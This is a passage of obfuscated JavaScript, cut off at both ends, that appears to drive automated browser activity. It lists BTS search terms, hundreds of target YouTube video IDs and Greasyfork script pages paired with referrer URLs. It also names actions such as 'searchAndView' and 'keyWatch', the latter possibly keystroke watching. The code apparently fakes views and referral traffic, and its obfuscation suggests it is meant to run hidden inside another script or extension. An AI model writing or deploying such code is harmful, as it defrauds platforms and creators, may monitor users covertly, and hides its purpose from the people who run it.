+ 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x3f5 * -0x2 + -0x1 * -0x18cd + -0x10e0);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    Y(0xf) + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + Y(0x17) + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': X(0xd) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + Y(0x2) + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + W(0x5, 'Eiv8') + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
